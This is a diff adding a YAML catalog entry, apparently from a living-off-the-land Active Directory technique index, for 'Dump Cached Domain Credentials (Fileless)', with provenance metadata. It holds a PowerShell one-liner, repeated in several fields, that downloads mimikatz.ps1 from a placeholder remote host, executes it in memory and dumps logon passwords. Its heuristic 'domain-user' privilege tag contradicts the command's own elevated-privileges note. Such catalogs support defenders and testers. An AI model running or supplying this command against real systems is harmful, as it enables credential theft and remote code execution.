@@ -1,0 +1,84 @@
+id: lolad/RHVtcCBDYWNoZWQgRG9tYWluIENyZWRlbnRpYWxzIChGaWxlbGVzcyk/SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vc2Vydmlkb3JfcmVtb3RvL21pbWlrYXR6LnBzMScpOyBJbnZva2UtTWltaWthdHogLUNvbW1hbmQgJ3Nla3VybHNhOjpsb2dvbnBhc3N3b3JkcycgKFJlcXVpcmVzIGVsZXZhdGVkIHByaXZpbGVnZXMp/UG93ZXJTaGVsbCAoRmlsZWxlc3Mp
+type: technique
+platform: active-directory
+name: Dump Cached Domain Credentials (Fileless)
+phases:
+- credential-access
+capabilities:
+- credential-access
+privilege_required: domain-user
+sources:
+- project: LOLAD
+  upstream_url: https://lolad-project.github.io
+  license: verify upstream LICENSE
+  upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
+  last_synced: '2026-11-13'
+commands:
+- template: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz
+    -Command 'sekurlsa::logonpasswords' (Requires elevated privileges)
+references:
+- https://lolad-project.github.io
+tags:
+- active-directory
+- lolad
+- powershell (fileless)
+source_data:
+  LOLAD:
+    raw:
+      name: Dump Cached Domain Credentials (Fileless)
+      command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz
+        -Command 'sekurlsa::logonpasswords' (Requires elevated privileges)
+      type: PowerShell (Fileless)
+      reference: Comprehensive Mimikatz Guide
+      physical_rows:
+      - input_ref: index.html#row=127
+        row_utf8: "<tr>\r\n\t\t    <td>Dump Cached Domain Credentials (Fileless)</td>\r\n\t\t    <td><code>IEX\
+          \ (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz\
+          \ -Command 'sekurlsa::logonpasswords'</code> (Requires elevated privileges)</td>\r\n\t\t   \
+          \ <td>PowerShell (Fileless)</td>\r\n\t\t    <td><a href=\"https://hadess.io/mimikatz-comprehensive-guide/\"\
+          \ target=\"_blank\">Comprehensive Mimikatz Guide</a></td>\r\n\t\t</tr>"
+        row_sha256: sha256:4b880f435a424cb0efb1f0f5b8cb61d79bb57a4ec21cabe2218e8f066ee8146c
+        cells:
+        - Dump Cached Domain Credentials (Fileless)
+        - IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz
+          -Command 'sekurlsa::logonpasswords' (Requires elevated privileges)
+        - PowerShell (Fileless)
+        - Comprehensive Mimikatz Guide
+      physical_occurrence_count: 1
+    upstream_url: https://lolad-project.github.io
+    upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: credential-access
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  phases:
+  - value: credential-access
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLAD: sha256:94cc7a7f12491cc4a0fa3ddffec1096735673b85f606ecbaed8225d8283e1266
